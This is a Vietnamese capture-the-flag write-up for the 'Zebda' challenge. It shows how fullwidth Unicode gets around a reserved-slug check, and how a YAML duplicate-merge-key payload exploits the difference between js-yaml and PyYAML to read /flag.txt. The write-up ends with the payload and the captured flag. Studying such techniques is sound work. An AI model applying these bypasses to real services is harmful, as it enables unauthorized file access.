# Zebda

### *Overview

Challenge gồm 3 services:

- Nginx: proxy vào middleware
- Middleware: Nhận project và YAML build manifest
- Worker: thực thi và có quyền `/flag.txt`

### Bug

- Trong middleware, nó chuẩn hóa tên project bằng cách dùng hàm `toLowerCase()`, và nó sẽ chặn slug **system** và **admin**:

```js
const reservedNames = new Set(['system', 'admin']);

function isReservedProjectName(slug) {
  return reservedNames.has(slug.toLowerCase());
}
app.post('/api/projects', jsonBodyParser, (req, res) => {
  const slug = req.body?.slug;
  if (typeof slug !== 'string' || slug.length === 0 || slug.length > 200) {
    return res.status(400).json({ error: 'slug must be a non-empty string' });
  }
  if (isReservedProjectName(slug)) {
    return res.status(403).json({ error: 'Reserved project name' });
  }

  const project = {
    id: randomUUID(),
    slug,
    createdAt: new Date().toISOString(),
  };
  projects.set(project.id, project);
  return res.status(201).json(publicProject(project));
});
```

- Nhưng `worker/app.py' không chặn tên slug, chỉ dùng chuẩn hóa kiểu khác:

    ```python
    POLICIES = {
    "standard": {"translate"},
    "system": {"translate", "import"},
    }

    def canonicalize_slug(raw_slug):
    return unicodedata.normalize("NFKC", raw_slug).casefold()

    ```

=> Từ đó, mình nghĩ có thể bypass để lấy slug `system` bằng cách dùng fullwidth Unicode `ｓｙｓｔｅｍ`, nhờ vậy ta có thể lấy action `import`

- Ý tưởng của mình là sử dụng action import để đọc file `/flag.txt`, nhưng middleware chỉ cho phép action `translate` và source `https`:

```python
function validateManifest(manifest) {
  if (!manifest || typeof manifest !== 'object' || Array.isArray(manifest)) {
    throw new Error('Manifest must be an object');
  }
  if (!manifest.job || typeof manifest.job !== 'object') {
    throw new Error('Manifest must contain a job');
  }
  if (manifest.job.action !== 'translate') {
    throw new Error('Unsupported action');
  }
  if (typeof manifest.job.source !== 'string') {
    throw new Error('Source must be a string');
  }

  let sourceUrl;
  try {
    sourceUrl = new URL(manifest.job.source);
  } catch {
    throw new Error('Source must be a valid URL');
  }
  if (sourceUrl.protocol !== 'https:') {
    throw new Error('Only HTTPS sources are allowed');
  }
}
```

- Nhưng sau khi validate xong, nó lại gửi raw YAML cho worker:

    ```python
    const workerResp = await fetch(`${WORKER_URL}/run`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ slug: project.slug, manifest: rawManifest }),
      signal: controller.signal,
    })
    ```
    
    - Vấn đề ở chỗ này là middleware dùng `js-yaml` còn woker dùng `PyYAML`, hai parser này khác nhau ở chỗ là nếu ta dùng khóa gộp trùng lặp, thì js-yaml sẽ lấy giá trị đầu, còn PyYAML sẽ lấy giá trị sau([Differ](https://blog.darkforge.io/yaml/merge/parser/differential/research/2026/02/11/YAML-Merge-Tags-and-Parser-Differentials.html))

=> Payload:
```
job:
  <<: {action: translate, source: https://example.com}
  <<: {action: import, source: file:///flag.txt}
```

> FLAG: L3AK{Parsers_T4$TE_th!ng$_diFFerently_Just_l!ke_Zebda}



